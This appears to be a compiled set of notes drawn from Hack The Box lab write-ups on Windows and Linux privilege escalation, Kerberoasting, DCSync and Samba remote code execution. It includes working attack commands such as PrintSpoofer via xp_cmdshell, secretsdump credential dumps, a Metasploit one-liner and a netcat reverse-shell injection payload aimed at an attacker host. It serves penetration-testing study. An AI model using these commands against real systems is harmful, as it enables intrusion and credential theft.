## Q6 — Kerberoasting in Active Directory

**Question:** How does Kerberoasting work in Active Directory environments and which HTB machines demonstrate it?

**Answer:**

**Kerberoasting in Active Directory**

Kerberoasting exploits the Kerberos service ticket (TGS) request process. An attacker with a valid domain account requests a Ticket Granting Service (TGS) ticket for a service principal name (SPN) associated with a user account. The Key Distribution Center (KDC) encrypts the TGS using the service account’s password hash. The attacker then extracts the ticket and performs offline brute‑force or dictionary attacks to recover the service account’s plaintext password. Because the request does not require the service’s involvement, the attack can be conducted stealthily from any domain‑joined host.

**Typical steps (as described in the write‑ups):**
1. Enumerate SPNs (e.g., using `GetUserSPNs.py` or BloodHound).  
2. Request a TGS for each SPN (Kerberos AS‑REQ → TGS‑REQ).  
3. Extract the encrypted ticket (often in Kirbi or base64 format).  
4. Crack the ticket offline with tools like Hashcat or John the Ripper to obtain the service account password.  
5. Use the recovered credentials for further lateral movement or privilege escalation.

**HTB machines that demonstrate Kerberoasting (based on the provided excerpts):**

- **htb-active** – Kerberoasting background and usage against a Windows domain (seen on: htb-active)  
- **htb-rebound** – Combines AS‑REP‑Roasting with Kerberoasting to obtain a crackable hash for a service account (seen on: htb-rebound)  
- **htb-administrator** – Performs a targeted Kerberoasting attack after abusing GenericWrite over a user (seen on: htb-administrator)  
- **htb-tombwatcher** – Uses BloodHound to find a path for targeted Kerberoasting against another user (seen on: htb-tombwatcher)  

These machines illustrate both generic and targeted Kerberoasting techniques within Active Directory environments.

# SeImpersonatePrivilege Abuse via Named Pipe Impersonation

## Technique Overview
On Windows 10 / Server 2016+, if a user account holds `SeImpersonatePrivilege`, an attacker can escalate to SYSTEM by:
1.  Starting a process running as SYSTEM (or another high-privilege user) that connects to a named pipe controlled by the attacker.
2.  Using the named pipe connection to steal the token of the SYSTEM process.
3.  Impersonating that token to execute commands as SYSTEM.

Common tools for this include **RoguePotato**, **SweetPotato**, **GodPotato**, and **PrintSpoofer**.

## Observed Exploitation Steps

### 1. Verification of Privilege
Check for the privilege using `whoami /priv`:
```powershell
whoami /priv
# Look for: SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```
*(seen on: htb-cereal, htb-pivotapi, htb-darkzero)*

### 2. Execution via PrintSpoofer (SQL Context)
When operating from a SQL shell (e.g., via `xp_cmdshell`), `PrintSpoofer` can be used to spawn a SYSTEM process and capture the token.

**Command:**
```sql
exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c whoami >\programdata\output"'
```
**Output:**
```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
*(seen on: htb-pivotapi)*

### 3. Execution via GodPotato (DC Context)
On Domain Controllers or systems with full privileges, `GodPotato` can be executed directly or via `RunAsCs.exe` to leverage the privilege.

**Context:**
-   Used on DC02 after obtaining a shell with `SeImpersonatePrivilege`.
-   Can be run directly from the shell or via `RunasCs.exe`.
*(seen on: htb-darkzero)*

### 4. Alternative Tools (RoguePotato / SweetPotato)
These tools utilize similar named pipe impersonation techniques to steal SYSTEM tokens on Windows 10/Server 2016+.
*(seen on: htb-cereal)*

## Key Requirements
-   **OS:** Windows 10 / Server 2016+
-   **Privilege:** `SeImpersonatePrivilege` must be **Enabled**.
-   **Mechanism:** The tool creates a named pipe, triggers a SYSTEM process to connect to it, and then uses `CreateProcessAsUser()` to impersonate the SYSTEM token.

### Privilege Escalation Phase

#### **DCSync via `secretsdump.py` (Impacket)**
DCSync replicates domain controller password data by impersonating another DC via DRSUAPI. Requires domain admin privileges or delegated "Replicating Directory Changes" permissions.

**Basic syntax:**
```bash
secretsdump.py 'username:password@target_ip'
```

**With Kerberos authentication (using ccache):**
```bash
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache secretsdump.py -k -no-pass dc01.vintage.htb
```

**Target specific user (avoid time skew issues):**
```bash
secretsdump.py -k -no-pass target.domain -just-dc-user administrator
```

**Just dump domain controller hashes:**
```bash
secretsdump.py -just-dc username:password@target_ip
```

**Common error - Clock skew:**
```
KRB_AP_ERR_SKEW(Clock skew too great)
```
Fix: Sync time with DC (`ntpdate target_ip`) or use `-use-vss` parameter (seen on: htb-flight)

#### **DCSync via `netexec` (nxc)**
```bash
KRB5CCNAME=dc01\$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache netexec smb dc01.vintage.htb -k --use-kcache --ntds --user administrator
```

Output includes NTDS hashes for specified user (seen on: htb-vintage)

## Foothold & Exploitation (GTFOBins & SUID Abuse)
*   **GTFOBins Abuse:**
    *   If a SUID binary is listed in GTFOBins, it can often be abused to spawn a root shell or execute arbitrary commands.
    *   *Note:* Specific GTFOBins techniques were observed on **htb-schooled** (Alternative GTFOBins).
*   **SUID Binary Manipulation:**
    *   **PwnKit (CVE-2021-4034):**
        *   Abuses mishandling of empty `argc` in `pkexec` to gain root execution.
        *   **Critical Check:** `pkexec` **must** have the SUID bit set (`-rwsr-xr-x`). If it is not SUID (e.g., `-rwxr-xr-x`), the exploit will only run as the current user and fail.
        *   (seen on: htb-paper)
    *   **Custom SUID Binaries:**
        *   Identify non-standard SUID binaries (e.g., `/var/htb/bin/emergency`) and analyze their functionality for command injection or shell spawning.
        *   (seen on: htb-bank)

## Privilege Escalation (Advanced SUID/Context Abuse)
*   **binfmt_misc "Shadow SUID" (C Flag Abuse):**
    *   **Technique:** Use the `C` flag in `binfmt_misc` rules to pull credentials from the program rather than the interpreter.
    *   **Goal:** Create a rule that matches a SetUID binary and calls a custom interpreter (that provides a shell) with the `C` flag. This allows the interpreter to run with the SUID binary's privileges (root).
    *   **Requirements:**
        1.  An interpreter that gives a shell.
        2.  A `binfmt_misc` rule matching a SetUID binary with the `C` flag.
    *   (seen on: htb-retired)
*   **SUID Restrictions (mpm-itk):**
    *   **Context:** In some environments (e.g., Apache with `mpm-itk`), SUID binaries may fail with `setresuid: Operation not permitted`.
    *   **Cause:** `mpm-itk` installs a `seccomp` filter to prevent privilege escalation, which blocks `suid` binaries when called by the MPM.
    *   **Mitigation/Check:** Look for `LimitUIDRange` and `LimitGIDRange` configurations in Apache/`mpm-itk` settings.
    *   (seen on: htb-pandora)

**Question:** How was a Samba vulnerability exploited for remote code execution across HTB machines?

## Samba Remote Code Execution Exploitation Across HTB Machines

### Recon
- **Identify Samba version and exposed shares**
  ```bash
  nmap -p 139,445 --script smb-version,smb-enum-shares <target>
  ```
  (seen on: htb-lame, htb-abducted)

- **Search for public exploits matching version**
  ```bash
  searchsploit samba <version>
  ```
  (seen on: htb-lame)

### Foothold

#### CVE-2007-2447 — "username map script" Command Execution (htb-lame)
- **Vulnerability**: Samba 3.0.20 < 3.0.25rc3 allows unauthenticated command execution via the `username map script` parameter.
- **Exploit**: Metasploit module `exploit/unix/remote/usermap_script` (Exploit-DB 16320.rb).
- **Execution**:
  ```bash
  msfconsole -q -x "use exploit/unix/remote/usermap_script; set RHOSTS <target>; run"
  ```
  - No authentication required; the option maps usernames pre-authentication.
  - Payload runs as root or nobody.
  (seen on: htb-lame)

#### CVE-2026-4480 — Print Subsystem Command Injection via `%J` Substitution (htb-abducted)
- **Vulnerability**: Samba printing subsystem passes client-controlled job description (`%J`) to the configured `print command` without escaping shell metacharacters (only single quotes replaced with underscores).
- **Exploit**: Craft a malicious print job description containing shell metacharacters (e.g., `; nc -e /bin/sh <attacker-ip> <port>`).
- **Requirements**: Write access to a Samba print share with `print command` configured using `%J`.
- **Impact**: Unauthenticated remote code execution (CVSS 10.0).
  (seen on: htb-abducted)

- No additional machines with Samba RCE details provided in the current corpus.
